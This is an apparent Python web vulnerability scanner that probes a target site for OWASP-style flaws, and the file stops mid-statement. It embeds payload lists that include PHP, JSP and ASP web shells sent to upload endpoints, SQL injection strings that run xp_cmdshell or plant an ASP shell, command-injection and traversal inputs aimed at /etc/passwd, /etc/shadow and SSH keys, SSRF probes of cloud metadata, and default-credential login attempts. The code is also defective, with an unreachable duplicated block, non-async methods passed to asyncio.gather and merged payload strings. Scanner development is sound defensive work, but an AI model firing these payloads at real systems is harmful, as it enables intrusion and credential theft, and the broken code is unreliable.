import requests
from bs4 import BeautifulSoup
import re
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor
from db_manager import DatabaseManager
import ssl
import socket
import json
import jwt
from datetime import datetime
import time
import asyncio

class EnhancedOWASPScanner:
    def __init__(self):
        self.session = requests.Session()
        self.db = DatabaseManager()
        self.vulnerabilities = []

    async def scan(self, target_url: str) -> list:
        """Main scanning function"""
        try:
            # Run all scans concurrently
            tasks = [
                self._check_security_headers(target_url),
                self._check_ssl_tls_advanced(target_url),
                self._test_authentication(target_url),
                self._test_access_control(target_url),
                self._test_xss_variants(target_url),
                self._test_csrf_vulnerabilities(target_url),
                self._test_ssrf_vulnerabilities(target_url),
                self._test_file_vulnerabilities(target_url),
                self._test_information_disclosure(target_url),
                self._test_client_side_exploits(target_url)
            ]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Filter out None results and flatten the list
            vulnerabilities = []
            for result in results:
                if isinstance(result, list):
                    vulnerabilities.extend(result)
                elif isinstance(result, dict):
                    vulnerabilities.append(result)
                elif isinstance(result, Exception):
                    print(f"Error in scan: {str(result)}")
            
            return vulnerabilities
            
        except Exception as e:
            print(f"Error in OWASP scan: {str(e)}")
            return []

    async def _check_security_headers(self, target_url: str) -> list:
        """Check for security headers"""
        vulnerabilities = []
        try:
            response = self.session.get(target_url)
            headers = response.headers
            
            # Check for missing security headers
            security_headers = {
                'X-Frame-Options': 'Missing X-Frame-Options header - vulnerable to clickjacking',
                'X-XSS-Protection': 'Missing X-XSS-Protection header',
                'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
                'Strict-Transport-Security': 'Missing HSTS header',
                'Content-Security-Policy': 'Missing Content Security Policy'
            }
            
            for header, message in security_headers.items():
                if header not in headers:
                    vulnerabilities.append({
                        'type': 'Missing Security Header',
                        'header': header,
                        'description': message,
                        'severity': 'Medium'
                    })
            
            return vulnerabilities
            
        except Exception as e:
            print(f"Error checking security headers: {str(e)}")
            return []

    async def _check_ssl_tls_advanced(self, target_url: str) -> list:
        """Check SSL/TLS configuration"""
        vulnerabilities = []
        try:
            parsed_url = urlparse(target_url)
            hostname = parsed_url.hostname
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate expiration
                    if cert and 'notAfter' in cert:
                        expiry = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        if expiry < datetime.now():
                            vulnerabilities.append({
                                'type': 'SSL Certificate',
                                'description': 'SSL certificate has expired',
                                'severity': 'Critical'
                            })
                    
                    # Check for weak cipher suites
                    cipher = ssock.cipher()
                    if cipher and cipher[0].startswith(('RC4', 'DES', '3DES')):
                        vulnerabilities.append({
                            'type': 'Weak Cipher',
                            'description': f'Weak cipher suite in use: {cipher[0]}',
                            'severity': 'High'
                        })
            
            return vulnerabilities
            
        except Exception as e:
            print(f"Error checking SSL/TLS: {str(e)}")
            return []

    async def _test_authentication(self, target_url: str) -> list:
        """Test authentication mechanisms"""
        vulnerabilities = []
        try:
            # Test for common authentication vulnerabilities
            test_credentials = [
                ('admin', 'admin'),
                ('administrator', 'password'),
                ('root', 'root'),
                ('test', 'test')
            ]
            
            login_paths = ['/login', '/admin', '/wp-admin', '/administrator']
            
            for path in login_paths:
                login_url = urljoin(target_url, path)
                try:
                    response = self.session.get(login_url)
                    if response.status_code == 200:
                        for username, password in test_credentials:
                            try:
                                login_data = {
                                    'username': username,
                                    'password': password
                                }
                                response = self.session.post(login_url, data=login_data)
                                
                                if response.status_code == 200 and not 'error' in response.text.lower():
                                    vulnerabilities.append({
                                        'type': 'Weak Credentials',
                                        'description': f'Default/weak credentials work: {username}:{password}',
                                        'severity': 'Critical'
                                    })
                            except:
                                continue
                except:
                    continue
            
            return vulnerabilities
            
        except Exception as e:
            print(f"Error testing authentication: {str(e)}")
            return []

    def _test_access_control(self, target_url):
        vulnerabilities = []
        
        # Define comprehensive file extension patterns
        sensitive_extensions = {
            'backup': ['.bak', '.backup', '.old', '.save', '.bak2', '.bck', '.tmp', '.temp', '.original'],
            'config': ['.conf', '.config', '.ini', '.env', '.cfg', '.json', '.yml', '.yaml', '.properties'],
            'database': ['.sql', '.db', '.sqlite', '.mdb', '.pdb', '.dbf', '.mdf', '.accdb'],
            'source_code': ['.php', '.asp', '.aspx', '.jsp', '.jspx', '.py', '.rb', '.java', '.cs', '.vb', '.js', '.ts'],
            'sensitive_docs': ['.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.rtf', '.csv'],
            'compressed': ['.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.tgz'],
            'logs': ['.log', '.logs', '.err', '.error', '.debug', '.trace'],
            'certificates': ['.crt', '.key', '.pem', '.p12', '.pfx', '.cer'],
            'dangerous': ['.phar', '.php7', '.pht', '.phP', '.exe', '.dll', '.so', '.bat', '.cmd', '.sh']
        }

        # Test for sensitive file exposure
        for category, extensions in sensitive_extensions.items():
            for ext in extensions:
                try:
                    # Check common patterns with extensions
                    patterns = [
                        f"backup{ext}",
                        f"old{ext}",
                        f"new{ext}",
                        f"temp{ext}",
                        f"test{ext}",
                        f"dev{ext}",
                        f"prod{ext}",
                        f"staging{ext}",
                        f"admin{ext}",
                        f"web{ext}",
                        f"www{ext}",
                        f"root{ext}",
                        f"system{ext}",
                        f"config{ext}",
                        f"db{ext}",
                        f"data{ext}"
                    ]
                    
                    for pattern in patterns:
                        test_url = urljoin(target_url, pattern)
                        response = self.session.head(test_url, allow_redirects=False)
                        
                        if response.status_code == 200:
                            severity = 'Critical' if category in ['database', 'certificates', 'dangerous'] else 'High'
                            vulnerabilities.append({
                                'type': 'Sensitive File Exposure',
                                'severity': severity,
                                'description': f'Found potentially sensitive {category} file: {pattern}',
                                'recommendation': f'Remove or protect access to {category} files',
                                'url': test_url
                            })
                except Exception as e:
                    continue
        try:
            # Test for directory traversal vulnerabilities
            traversal_payloads = [
                '../', '..\\', '..//', '%2e%2e%2f', '%252e%252e%252f',
                '%c0%ae%c0%ae%c0%af', '%uff0e%uff0e%u2215', '%uff0e%uff0e%u2216',
                '%u002e%u002e%u2215', '%u002e%u002e%u2216', '%c0%2e%c0%2e%c0%af',
                '%e0%40%ae%e0%40%ae%e0%80%af', '..././', '...\\.\\', '..;/',
                'file:///etc/passwd', 'http://127.0.0.1:8080',
                '/etc/passwd', '/etc/shadow', '/etc/hosts',
                '/proc/self/environ', '/proc/version', '/proc/cmdline',
                '/home/$USER/.ssh/id_rsa', '/var/log/apache/access.log',
                '/var/log/nginx/error.log', '/usr/local/apache2/log/error_log',
                '%252e%252e/%252e%252e/%252e%252e//etc/passwd',
                '../../../../../../../../../etc/passwd%00.jpg',
                '/../../../../../../../../etc/passwd%00.gif'
            ]
            
            sensitive_files = [
                'config.php', 'wp-config.php', '.env', 'web.config',
                'database.yml', 'settings.py', 'config.json'
            ]
            
            # Test each traversal payload
            for payload in traversal_payloads:
                for sensitive_file in sensitive_files:
                    test_url = urljoin(target_url, payload + sensitive_file)
                    try:
                        response = self.session.get(test_url, allow_redirects=False)
                        if response.status_code == 200:
                            content_sample = response.text[:200]
                            if any(indicator in content_sample.lower() for indicator in
                                ['password', 'secret', 'config', 'root:', 'mysql', 'database']):
                                vulnerabilities.append({
                                    'type': 'Directory Traversal',
                                    'severity': 'Critical',
                                    'description': f'Directory traversal vulnerability found with payload: {payload}',
                                    'url': test_url,
                                    'evidence': 'Sensitive content detected in response'
                                })
                    except:
                        continue
            
            # Test for IDOR vulnerabilities
            sensitive_endpoints = ['/user/', '/profile/', '/account/', '/order/']
            for endpoint in sensitive_endpoints:
                for id in range(1, 5):
                    response = self.session.get(urljoin(target_url, f'{endpoint}{id}'))
                    if response.status_code == 200:
                        vulnerabilities.append({
                            'type': 'IDOR',
                            'severity': 'High',
                            'description': f'Potential IDOR vulnerability at {endpoint}',
                            'recommendation': 'Implement proper access controls'
                        })

            # Test for privilege escalation
            admin_endpoints = ['/admin', '/dashboard', '/manage', '/settings']
            for endpoint in admin_endpoints:
                response = self.session.get(urljoin(target_url, endpoint))
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Privilege Escalation',
                        'severity': 'Critical',
                        'description': f'Unauthorized access to admin endpoint {endpoint}',
                        'recommendation': 'Implement proper authorization checks'
                    })

            # Test for path traversal
            traversal_payloads = ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini', '....//....//etc/passwd']
            for payload in traversal_payloads:
                response = self.session.get(urljoin(target_url, f'?path={payload}'))
                if any(indicator in response.text for indicator in ['root:', '[extensions]']):
                    vulnerabilities.append({
                        'type': 'Path Traversal',
                        'severity': 'Critical',
                        'description': 'Path traversal vulnerability detected',
                        'recommendation': 'Validate and sanitize file paths'
                    })

            # Test for broken access control in API endpoints
            api_endpoints = ['/api/users', '/api/orders', '/api/admin', '/api/config']
            for endpoint in api_endpoints:
                response = self.session.get(urljoin(target_url, endpoint))
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Broken API Access Control',
                        'severity': 'High',
                        'description': f'Unprotected API endpoint: {endpoint}',
                        'recommendation': 'Implement API authentication and authorization'
                    })

            # Test for sensitive data exposure
            patterns = {
                'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                'credit_card': r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b',
                'api_key': r'[a-zA-Z0-9]{32,}',
                'jwt': r'eyJ[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+'
            }

            response = self.session.get(target_url)
            for data_type, pattern in patterns.items():
                if re.search(pattern, response.text):
                    vulnerabilities.append({
                        'type': 'Sensitive Data Exposure',
                        'severity': 'Critical',
                        'description': f'Exposed {data_type} found in response',
                        'recommendation': 'Implement data masking and encryption'
                    })

        except Exception as e:
            print(f"Error in access control testing: {str(e)}")

        return vulnerabilities

    def _test_rce_vulnerabilities(self, target_url):
        vulnerabilities = []
        try:
            # Test file upload vulnerabilities
            file_upload_endpoints = ['/upload', '/file/upload', '/api/upload']
            malicious_files = {
                'php': {'content': '<?php system($_GET["cmd"]); ?>', 'type': 'application/x-php'},
                'jsp': {'content': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'type': 'application/x-jsp'},
                'asp': {'content': '<%Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll())%>', 'type': 'application/x-asp'}
            }

            for endpoint in file_upload_endpoints:
                for ext, file_data in malicious_files.items():
                    files = {'file': (f'test.{ext}', file_data['content'], file_data['type'])}
                    response = self.session.post(urljoin(target_url, endpoint), files=files)
                    if response.status_code == 200:
                        vulnerabilities.append({
                            'type': 'RCE',
                            'severity': 'Critical',
                            'description': f'Potential file upload RCE via {ext} file',
                            'recommendation': 'Implement strict file type validation and content scanning'
                        })

            # Test template injection
            template_payloads = [
                '{{7*7}}',
                '${7*7}',
                '<#if 7*7==49>vulnerable</#if>',
                '#{7*7}'
            ]
            for payload in template_payloads:
                response = self.session.get(f"{target_url}?template={payload}")
                if '49' in response.text:
                    vulnerabilities.append({
                        'type': 'RCE',
                        'severity': 'Critical',
                        'description': 'Template injection vulnerability detected',
                        'recommendation': 'Sanitize user input and disable template execution'
                    })

            # Test deserialization
            deser_payloads = [
                {'data': 'O:8:"stdClass":0:{}', 'type': 'PHP'},
                {'data': 'rO0ABXNyAA==', 'type': 'Java'},
                {'data': '__import__("os").system("id")', 'type': 'Python'}
            ]
            for payload in deser_payloads:
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                response = self.session.post(target_url, data={'data': payload['data']}, headers=headers)
                if any(indicator in response.text.lower() for indicator in ['uid=', 'system32', '/bin/']):
                    vulnerabilities.append({
                        'type': 'RCE',
                        'severity': 'Critical',
                        'description': f'Potential {payload["type"]} deserialization vulnerability',
                        'recommendation': 'Implement secure deserialization practices'
                    })

        except Exception as e:
            print(f"Error in RCE vulnerability testing: {str(e)}")
        return vulnerabilities

    def _test_xss_variants(self, target_url):
        vulnerabilities = []
        try:
            # Test for various XSS variants
            # Test for SQL injection
            sql_payloads = [
                # Query Break
                "'", "%27", "\"", "%22", "#", "%23", ";", "%3B", ")", "`",
                "')", '"))', '`)', "''))", '")))', '`))', '*', '&apos;',
                "'/*", "'/\*", "';--", "*/",
                # Multiple encoding
                "%%2727", "%25%27",
                # Query Join
                "#comment", "-- comment", "/*comment*/", "/*! MYSQL Special SQL */",
                # Break variations
                "' -- -", "'--'", "\"--\"", "') or true--", "\" or \"1\"=\"1",
                "\" or \"1\"=\"1\"#", "\" or \"1\"=\"1\"/*", "\"or 1=1 or \"\"=\"",
                '") or ("1"="1"', '") or ("1"="1"--', '") or ("1"="1"#',
                '") or ("1"="1"/*', '") or "1"="1"', '") or "1"="1"--',
                '") or "1"="1"#', '") or "1"="1"/*',
                # Standard SQL injection
                "' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT username,password FROM users--",
                "<script>alert(1)</script>",
                "<Script>alert(document.domain)</Script>",
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=alert(document.cookie)>",
                "<svg/onload=alert(1)>",
                "<body onload=alert(123)>",
                "<iframe src='javascript:alert(1)'>",
                "<audio src/onerror=alert(1)>",
                "<img src=\"javascript:alert('XSS')\">",
                "<object type=\"text/x-scriptlet\" data=\"http://xss.rocks/scriptlet.html\"></object>",
                "{{$on.constructor('alert(1)')()}}",
                "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
                "<math><style><img src onerror=alert(2)></style></math>",
                "' WAITFOR DELAY '0:0:10'--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' OR 'x'='x",
                "admin' --",
                "admin' #",
                "' OR '1'='1' #",
                "' OR '1'='1' /*",
                "' OR 1=1 LIMIT 1;#",
                "1' ORDER BY 1--+",
                "1' ORDER BY 2--+",
                "1' ORDER BY 3--+",
                "1' UNION SELECT table_name,2 FROM information_schema.tables--",
                "1' UNION SELECT column_name,2 FROM information_schema.columns--",
                "' AND 1=convert(int,@@version)--",
                "'; EXEC xp_cmdshell 'ping 10.10.10.10'--",
                "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\test.asp',@text='<%execute(request(\"cmd\"))%>'--"
            ]
            for payload in sql_payloads:
                response = self.session.get(f"{target_url}?id={payload}")
                if any(indicator in response.text.lower() for indicator in ['sql', 'mysql', 'oracle', 'syntax error']):
                    vulnerabilities.append({
                        'type': 'SQL Injection',
                        'severity': 'Critical',
                        'description': 'SQL injection vulnerability detected',
                        'recommendation': 'Use parameterized queries and input validation'
                    })

            # Test for NoSQL injection
            nosql_payloads = [
                '{"$gt": ""}'
                '{"$ne": null}',
                '{"$where": "sleep(5000)"}'
            ]
            for payload in nosql_payloads:
                response = self.session.get(f"{target_url}?query={payload}")
                if response.elapsed.total_seconds() > 5:
                    vulnerabilities.append({
                        'type': 'NoSQL Injection',
                        'severity': 'High',
                        'description': 'NoSQL injection vulnerability detected',
                        'recommendation': 'Implement proper input validation and sanitization'
                    })

            # Test for LDAP injection
            ldap_payloads = [
                "*)(|",
                "*)(uid=*))(|",
                "*)(|(password=*))"
            ]
            for payload in ldap_payloads:
                response = self.session.get(f"{target_url}?user={payload}")
                if any(indicator in response.text.lower() for indicator in ['ldap', 'directory']):
                    vulnerabilities.append({
                        'type': 'LDAP Injection',
                        'severity': 'High',
                        'description': 'LDAP injection vulnerability detected',
                        'recommendation': 'Implement proper LDAP input escaping'
                    })

            # Test for command injection
            cmd_payloads = [
                "; ls -la",
                "& dir",
                "| whoami",
                "`cat /etc/passwd`",
                "$(id)"
            ]
            for payload in cmd_payloads:
                response = self.session.get(f"{target_url}?cmd={payload}")
                if any(indicator in response.text.lower() for indicator in ['root:', 'system32', '/bin/', 'uid=']):
                    vulnerabilities.append({
                        'type': 'Command Injection',
                        'severity': 'Critical',
                        'description': 'Command injection vulnerability detected',
                        'recommendation': 'Avoid command execution with user input'
                    })

            xss_payloads = {
                'reflected': [
                    '<script>alert(1)</script>',
                    '"><script>alert(1)</script>',
                    '><script>alert(1)</script>',
                    '<img src=x onerror=alert(1)>',
                    '"><img src=x onerror=alert(1)>',
                    '><img src=x onerror=alert(1)>'
                ],
                'html': [
                    '<h1>HTML</h1>', '<h2>HTML</h2>', '<h3>HTML</h3>',
                    '<pre>HTML</pre>', '<p>HTML</p>', '<i>HTML</i>',
                    '<a href="https://www.google.com">HTML</a>',
                    '<abbr title="HTML">HTML</abbr>',
                    '<article><h2>Armour Infosec</h2></article>',
                    '<audio controls><source src="demo.ogg" type="audio/ogg"></audio>',
                    '<iframe src="https://www.google.com" title="test"></iframe>',
                    '<div>HTML</div>', '<style>h1 {color:red;}</style>',
                    '<textarea>Html injected</textarea>',
                    '<button type="button">Click Me!</button>',
                    '<form method="GET">Username: <input type="text" name="username" value="" /></form>',
                    '<img src="index.jpg" alt="Test" width="500" height="600">',
                    '<svg width="100" height="100"><circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" /></svg>',
                    '&lt;h1&gt;HTML&lt;/h1&gt;',
                    '&#60;h1&#62;HTML&#60;/h1&#62;',
                    '%3Ch1%3EHTML%3C%2Fh1%3E',
                    '%253Ch1%253EHTML%253C%252Fh1%253E',
                    'PGgxPkhUTUw8L2gxPg==',
                    '<<h1>HTML</h1>>'
                ],
                'stored': [
                    {'endpoint': '/comment', 'data': {'content': '<script>alert(1)</script>'}},
                    {'endpoint': '/profile', 'data': {'bio': '<img src=x onerror=alert(1)>'}},
                    {'endpoint': '/post', 'data': {'title': '<script>alert(1)</script>'}}
                ],
                'dom': [
                    'javascript:alert(1)//',
                    '#<script>alert(1)</script>',
                    'javascript:void(alert(1))',
                    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
                ]
            }

            # Test for reflected XSS
            for payload in xss_payloads['reflected']:
                response = self.session.get(f"{target_url}?q={payload}")
                if payload in response.text:
                    vulnerabilities.append({
                        'type': 'Reflected XSS',
                        'severity': 'High',
                        'description': 'Reflected XSS vulnerability detected',
                        'recommendation': 'Implement proper input validation and output encoding'
                    })

            # Test for stored XSS
            for test in xss_payloads['stored']:
                response = self.session.post(urljoin(target_url, test['endpoint']), json=test['data'])
                if any(payload in response.text for payload in test['data'].values()):
                    vulnerabilities.append({
                        'type': 'Stored XSS',
                        'severity': 'Critical',
                        'description': f'Stored XSS vulnerability detected at {test["endpoint"]}',
                        'recommendation': 'Implement proper input sanitization and content security policy'
                    })

            # Test for DOM-based XSS
            for payload in xss_payloads['dom']:
                response = self.session.get(f"{target_url}#{payload}")
                if payload in response.text:
                    vulnerabilities.append({
                        'type': 'DOM-based XSS',
                        'severity': 'High',
                        'description': 'DOM-based XSS vulnerability detected',
                        'recommendation': 'Implement proper client-side input validation and sanitization'
                    })

            # Test for template injection
            template_payloads = [
                '{{7*7}}',
                '${7*7}',
                '<#if 7*7==49>vulnerable</#if>',
                '#{7*7}'
            ]
            for payload in template_payloads:
                response = self.session.get(f"{target_url}?template={payload}")
                if '49' in response.text:
                    vulnerabilities.append({
                        'type': 'Template Injection',
                        'severity': 'Critical',
                        'description': 'Server-side template injection vulnerability detected',
                        'recommendation': 'Disable template execution for user input or implement proper sanitization'
                    })

        except Exception as e:
            print(f"Error in XSS variants testing: {str(e)}")
        return vulnerabilities
        try:
            # Test for SQL injection
            sql_payloads = [
                # Query Break
                "'", "%27", "\"", "%22", "#", "%23", ";", "%3B", ")", "`",
                "')", '"))', '`)', "''))", '")))', '`))', '*', '&apos;',
                "'/*", "'/\*", "';--", "*/",
                # Multiple encoding
                "%%2727", "%25%27",
                # Query Join
                "#comment", "-- comment", "/*comment*/", "/*! MYSQL Special SQL */",
                # Break variations
                "' -- -", "'--'", "\"--\"", "') or true--", "\" or \"1\"=\"1",
                "\" or \"1\"=\"1\"#", "\" or \"1\"=\"1\"/*", "\"or 1=1 or \"\"=\"",
                '") or ("1"="1"', '") or ("1"="1"--', '") or ("1"="1"#',
                '") or ("1"="1"/*', '") or "1"="1"', '") or "1"="1"--',
                '") or "1"="1"#', '") or "1"="1"/*',
                # Standard SQL injection
                "' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT username,password FROM users--",
                "<script>alert(1)</script>",
                "<Script>alert(document.domain)</Script>",
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=alert(document.cookie)>",
                "<svg/onload=alert(1)>",
                "<body onload=alert(123)>",
                "<iframe src='javascript:alert(1)'>",
                "<audio src/onerror=alert(1)>",
                "<img src=\"javascript:alert('XSS')\">",
                "<object type=\"text/x-scriptlet\" data=\"http://xss.rocks/scriptlet.html\"></object>",
                "{{$on.constructor('alert(1)')()}}",
                "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
                "<math><style><img src onerror=alert(2)></style></math>",
                "' WAITFOR DELAY '0:0:10'--",
                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' OR 'x'='x",
                "admin' --",
                "admin' #",
                "' OR '1'='1' #",
                "' OR '1'='1' /*",
                "' OR 1=1 LIMIT 1;#",
                "1' ORDER BY 1--+",
                "1' ORDER BY 2--+",
                "1' ORDER BY 3--+",
                "1' UNION SELECT table_name,2 FROM information_schema.tables--",
                "1' UNION SELECT column_name,2 FROM information_schema.columns--",
                "' AND 1=convert(int,@@version)--",
                "'; EXEC xp_cmdshell 'ping 10.10.10.10'--",
                "'; EXEC sp_makewebtask 'C:\\inetpub\\wwwroot\\test.asp',@text='<%execute(request(\"cmd\"))%>'--"
            ]
            for payload in sql_payloads:
                response = self.session.get(f"{target_url}?id={payload}")
                if any(indicator in response.text.lower() for indicator in ['sql', 'mysql', 'oracle', 'syntax error']):
                    vulnerabilities.append({
                        'type': 'SQL Injection',
                        'severity': 'Critical',
                        'description': 'SQL injection vulnerability detected',
                        'recommendation': 'Use parameterized queries and input validation'
                    })

            # Test for NoSQL injection
            nosql_payloads = [
                '{"$gt": ""}'
                '{"$ne": null}',
                '{"$where": "sleep(5000)"}'
            ]
            for payload in nosql_payloads:
                response = self.session.get(f"{target_url}?query={payload}")
                if response.elapsed.total_seconds() > 5:
                    vulnerabilities.append({
                        'type': 'NoSQL Injection',
                        'severity': 'High',
                        'description': 'NoSQL injection vulnerability detected',
                        'recommendation': 'Implement proper input validation and sanitization'
                    })

            # Test for LDAP injection
            ldap_payloads = [
                "*)(|",
                "*)(uid=*))(|",
                "*)(|(password=*))"
            ]
            for payload in ldap_payloads:
                response = self.session.get(f"{target_url}?user={payload}")
                if any(indicator in response.text.lower() for indicator in ['ldap', 'directory']):
                    vulnerabilities.append({
                        'type': 'LDAP Injection',
                        'severity': 'High',
                        'description': 'LDAP injection vulnerability detected',
                        'recommendation': 'Implement proper LDAP input escaping'
                    })

            # Test for command injection
            cmd_payloads = [
                "; ls -la",
                "& dir",
                "| whoami",
                "`cat /etc/passwd`",
                "$(id)"
            ]
            for payload in cmd_payloads:
                response = self.session.get(f"{target_url}?cmd={payload}")
                if any(indicator in response.text.lower() for indicator in ['root:', 'system32', '/bin/', 'uid=']):
                    vulnerabilities.append({
                        'type': 'Command Injection',
                        'severity': 'Critical',
                        'description': 'Command injection vulnerability detected',
                        'recommendation': 'Avoid command execution with user input'
                    })

            xss_payloads = {
                'reflected': [
                    '<script>alert(1)</script>',
                    '"><script>alert(1)</script>',
                    '><script>alert(1)</script>'
                ],
                'stored': [
                    {'endpoint': '/comment', 'data': {'content': '<script>alert(1)</script>'}},
                    {'endpoint': '/profile', 'data': {'bio': '<img src=x onerror=alert(1)>'}}
                ],
                'dom': [
                    'javascript:alert(1)//',
                    '#<script>alert(1)</script>',
                    'javascript:void(alert(1))'
                ]
            }

            # Test reflected XSS
            for payload in xss_payloads['reflected']:
                response = self.session.get(f"{target_url}?q={payload}")
                if payload in response.text:
                    vulnerabilities.append({
                        'type': 'Reflected XSS',
                        'severity': 'High',
                        'description': 'Reflected XSS vulnerability detected',
                        'recommendation': 'Implement proper output encoding'
                    })

            # Test stored XSS
            for test in xss_payloads['stored']:
                post_response = self.session.post(urljoin(target_url, test['endpoint']), json=test['data'])
                get_response = self.session.get(urljoin(target_url, test['endpoint']))
                if any(payload in get_response.text for payload in test['data'].values()):
                    vulnerabilities.append({
                        'type': 'Stored XSS',
                        'severity': 'Critical',
                        'description': f'Stored XSS vulnerability in {test["endpoint"]}',
                        'recommendation': 'Implement proper input validation and output encoding'
                    })

            # Test DOM-based XSS
            for payload in xss_payloads['dom']:
                response = self.session.get(f"{target_url}#{payload}")
                if payload in response.text:
                    vulnerabilities.append({
                        'type': 'DOM XSS',
                        'severity': 'High',
                        'description': 'DOM-based XSS vulnerability detected',
                        'recommendation': 'Implement proper DOM sanitization'
                    })

        except Exception as e:
            print(f"Error in XSS variant testing: {str(e)}")
        return vulnerabilities

    def _test_csrf_vulnerabilities(self, target_url):
        vulnerabilities = []
        try:
            # Test CSRF token presence
            response = self.session.get(target_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            csrf_token = soup.find('input', {'name': ['csrf', 'csrf_token', '_token']})

            if not csrf_token:
                vulnerabilities.append({
                    'type': 'CSRF',
                    'severity': 'High',
                    'description': 'No CSRF token found in forms',
                    'recommendation': 'Implement CSRF tokens for all state-changing operations'
                })

            # Test CSRF token validation
            test_endpoints = [
                {'path': '/user/profile', 'method': 'POST'},
                {'path': '/user/password', 'method': 'POST'},
                {'path': '/user/settings', 'method': 'POST'}
            ]

            for endpoint in test_endpoints:
                response = self.session.request(
                    endpoint['method'],
                    urljoin(target_url, endpoint['path']),
                    headers={'X-CSRF-Token': 'invalid_token'},
                    allow_redirects=False
                )
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'CSRF',
                        'severity': 'High',
                        'description': f'CSRF protection bypass possible at {endpoint["path"]}',
                        'recommendation': 'Implement proper CSRF token validation'
                    })

        except Exception as e:
            print(f"Error in CSRF vulnerability testing: {str(e)}")
        return vulnerabilities

    def _test_ssrf_vulnerabilities(self, target_url):
        vulnerabilities = []
        
        # Comprehensive SSRF payloads
        ssrf_payloads = [
            # Localhost variations
            'http://127.0.0.1/', 'http://127.0.0.1:22/', 'http://127.0.0.1:443/',
            'http://0.0.0.0/', 'http://0.0.0.0:22/', 'http://0.0.0.0:443/',
            'http://localhost/', 'http://localhost:22/', 'http://localhost:443/',
            'https://127.0.0.1/', 'https://localhost/', 'https://0.0.0.0/',
            'http://0/', 'http://[::]', 'https://127.0.0.1', 'https://localhost',
            
            # IPv6 variations
            'http://[::]:80', 'http://[::]:25', 'http://[::]:22', 'http://[::]:3128',
            'http://0000::1:80', 'http://0000::1:25', 'http://0000::1:22', 'http://0000::1:3128',
            'http://[0:0:0:0:0:ffff:127.0.0.1]',
            
            # IP variations
            'http://127.127.127.127', 'http://127.0.1.3', 'http://127.0.0.0',
            'http://2130706433', 'http://127.1', 'http://127.0.1',
            'localhost:+11211aaa', 'localhost:00011211aaaa',
            
            # DNS rebinding
            'http://customer2-app-127-0-0-1.nip.io/',
            'http://customer3-app-7f000101.nip.io/',
            
            # File protocol
            'file:///etc/passwd', 'file://\/\/etc/passwd',
            
            # Encoded variations
            'http://127.0.0.1/%2561dmin', 'http://127.1/%2561dmin',
            '127。0。0。1', 'http://①②⑦.①/', 'http://①②⑦.①:22/',
            
            # Protocol variations
            'http://0:22/', 'https://0/', 'http://127.1:22/',
            'https://127.1/', 'https://127.0.1/',
            
            # Octal and other formats
            'http://0177.0.0.1/', 'http://0177.0.0.1:22/', 'https://0177.0.0.1/',
            'http://017700000001/', 'http://017700000001:22/', 'https://017700000001/',
            
            # URL with credentials
            'http://example.com@127.0.0.1/', 'https://example.com@127.0.0.1/',
            
            # Sensitive files
            'file:///etc/group', 'file:///var/www/html/.htaccess',
            'file:///etc/hosts', 'file:///etc/resolv.conf',
            'file:///etc/sysconfig/network', 'file:///etc/network/interfaces',
            'file:///proc/version', 'file:///etc/os-release'
        ]
        try:
            ssrf_endpoints = [
                {'path': '/api/fetch', 'param': 'url'},
                {'path': '/proxy', 'param': 'target'},
                {'path': '/webhooks', 'param': 'callback'}
            ]

            test_urls = [
                'http://169.254.169.254/latest/meta-data/',  # AWS metadata
                'http://127.0.0.1:22',  # Local SSH
                'http://localhost/admin',  # Local admin
                'file:///etc/passwd'  # Local file
            ]

            for endpoint in ssrf_endpoints:
                for test_url in test_urls:
                    response = self.session.get(
                        urljoin(target_url, endpoint['path']),
                        params={endpoint['param']: test_url}
                    )
                    if response.status_code == 200:
                        vulnerabilities.append({
                            'type': 'SSRF',
                            'severity': 'Critical',
                            'description': f'Potential SSRF at {endpoint["path"]}',
                            'recommendation': 'Implement URL validation and whitelist'
                        })

        except Exception as e:
            print(f"Error in SSRF vulnerability testing: {str(e)}")
        return vulnerabilities

    def _test_file_vulnerabilities(self, target_url):
        vulnerabilities = []
        try:
            # Test file upload vulnerabilities
            upload_tests = [
                {'file': 'test.php', 'content': '<?php phpinfo(); ?>', 'type': 'application/x-php'},
                {'file': 'test.html', 'content': '<script>alert(1)</script>', 'type': 'text/html'},
                {'file': '../../../etc/passwd', 'content': 'test', 'type': 'text/plain'}
            ]

            for test in upload_tests:
                files = {'file': (test['file'], test['content'], test['type'])}
                response = self.session.post(urljoin(target_url, '/upload'), files=files)
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'File Upload',
                        'severity': 'High',
                        'description': f'Insecure file upload possible with {test["file"]}',
